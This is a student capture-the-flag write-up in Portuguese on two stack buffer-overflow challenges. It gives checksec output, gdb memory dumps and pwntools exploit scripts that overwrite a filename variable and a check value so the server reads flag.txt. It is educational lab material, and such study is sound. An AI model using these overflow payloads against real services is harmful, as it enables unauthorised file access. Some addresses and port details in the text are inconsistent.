# CTF 5

## Desafio 1

### Contexto

A plataforma CTF fornece um ficheiro ZIP com os seguintes ficheiros: um executável (program), o código fonte (main.c) e um script em python (exploit-example.py). Para além disso, é indicado que o serviço se encontra à escuta na porta 4003 do host ctf-fsi.fe.up.pt. Para contactar este serviço pode utilizar-se o programa netcat da shell seguinte forma nc ctf-fsi.fe.up.pt 4003, ou executar o script em python que é fornecido ($ python3 exploit-example.py) de forma a interagir com o serviço.

A flag encontra-se num ficheiro chamado flag.txt, no working directory. O objetivo é de alguma forma ler este ficheiro tomando controlo das funcionalidades do programa que se encontra a correr.

### Checksec

~~~ 
[*] '/home/diogo/Documents/FSI/CTF 3/Desafio1/program'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments 
~~~

### Code Analysis

- Para começar, compilamos o main.c com o Address Sanitizer para ver se existia algum erro de memória. Ao corrermos o código, reparamos que havia um erro de buffer overflow na chamada à função scanf.

- O scanf é o input do utilizador para um buffer de 32 bytes, mas o scanf não verifica o tamanho do input, o que permite que o utilizador escreva mais do que 32 bytes para o buffer, o que causa um buffer overflow.

- O ficheiro mem.txt é aberto para leitura no programa, mas, como não é criado por este, podemos mudar qual o ficheiro aberto, para isso temos que fazer um buffer overflow para mudar o valor da variável filename.

- Com o gdb encontramos o endereço do buffer:

```bash
(gdb) x/40x buffer
0xffffd658:	0x00000000	0x00000000	0xffffffff	0xf7c0c840
0xffffd668:	0xf7fc1380	0x00000000	0x00000000	0x00000000
0xffffd678:	0x2e6d656d	0x00747874	0x00000000	0xf7e20e34
0xffffd688:	0x00000000	0xf7c23af9	0x00000001	0xffffd744
0xffffd698:	0xffffd74c	0xffffd6b0	0xf7e20e34	0x08049236
0xffffd6a8:	0x00000001	0xffffd744	0xf7e20e34	0x08049320
0xffffd6b8:	0xf7ffcb80	0x00000000	0x7237a9ce	0x09efe3de
0xffffd6c8:	0x00000000	0x00000000	0x00000000	0xf7ffcb80
0xffffd6d8:	0x00000000	0x2e237200	0xf7ffda30	0xf7c23a86
0xffffd6e8:	0xf7e20e34	0xf7c23bbd	0xf7fc9c48	0x0804b2b8
```

- 0xfffd658 é o inicio do buffer e como o buffer tem 32 bytes, sabemos que o endereço da variável filename é 0xffffd678. Confirmamos tal fazendo uso ao seguinte comando:

```bash
(gdb) x meme_file 
0xffffd678:	0x2e6d656d
```

### Exploit 

~~~
from pwn import *

target = './program'
io = connect('ctf-fsi.fe.up.pt', 4003)

payload = b'A'*32 + b'flag.txt\0'

io.sendline(payload)

output = io.recvall()
print(output)
~~~

O exploit que criamos funciona da seguinte forma:

1. Conectamo-nos ao servidor com `io = connect('ctf-fsi.fe.up.pt', 4003)`
2. Criamos um payload que enche o buffer e escreve por cima do endereço correspondente ao filename já que o mesmo se encontra a seguir ao buffer.
3. Mandamos o payload pelo terminal, o filename passa a ser flag.txt e a mesma é impressa .


## Desafio 2

### Contexto

Novamente, é fornecido um ficheiro ZIP com um executável (program) e o código fonte (main.c). Podes e deves adaptar o script python que te foi dado anteriormente para interagir com este novo desafio. O Desafio 2 é uma versão ligeiramente mais elaborada do Desafio 1 e está disponível na porta 4000

### Checksec

[*] '/home/diogo/Documents/FSI/CTF 3/Desafio2/program'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments

### Code Analysis

- Este problema é semelhante ao anterior, mas adiciona uma verificação de uma variável val que pode ser sobreposta com o buffer overflow da mesma maneira que a anterior.

```
bash
(gdb) x/40 buffer
0xffffd653:	0x00000000	0x00000000	0x00000000	0xffffff00
0xffffd663:	0xc0c840ff	0xfc1380f7	0x000000f7	0x00000000
0xffffd673:	0x2e6d656d	0x00747874	0xadbeef00	0x000000de
0xffffd683:	0xe20e3400	0x000000f7	0xc23af900	0x000001f7
0xffffd693:	0xffd74400	0xffd74cff	0xffd6b0ff	0xe20e34ff
0xffffd6a3:	0x049236f7	0x00000108	0xffd74400	0xe20e34ff
0xffffd6b3:	0x049340f7	0xffcb8008	0x000000f7	0x1b422300
0xffffd6c3:	0xc30833d4	0x000000af	0x00000000	0x00000000
0xffffd6d3:	0xffcb8000	0x000000f7	0x05510000	0xffda3028
0xffffd6e3:	0xc23a86f7	0xe20e34f7	0xc23bbdf7	0xfc9c48f7
(gdb) x meme_file 
0xffffd673:	0x2e6d656d
(gdb) x val
0xffffd67c:	0xdeadbeef
```
- O endereço da variável val é 0xffffd67c, o endereco do buffer é 0xffffd653 e o endereço do filename é 0xffffd673, o que significa que temos de encher o buffer e escrever por cima do val e do filename.
 
### Exploit 

~~~
from pwn import *

target = './program'
io = connect('ctf-fsi.fe.up.pt', 4000)

payload = b'A'*32 + b'\x24\x23\xfc\xfe'+b'flag.txt\0'

io.sendline(payload)

output = io.recvall()
print(output)
~~~

O exploit que criamos funciona da seguinte forma:

1. Conectamos-nos ao servidor com `io = connect('ctf-fsi.fe.up.pt', 4003)`. E mandamos o payload pelo terminal o filename passa a ser flag.txt, conseguimos ultrapassar a verificação do val e a flag é impressa.
   
2. Criamos um payload que enche o buffer, escreve por cima do val e escreve por cima do endereço correspondente ao filename.

3. E mandamos o payload pelo terminal o filename passa a ser flag.txt, conseguimos ultrapassar a verificação do val e a flag é impressa.

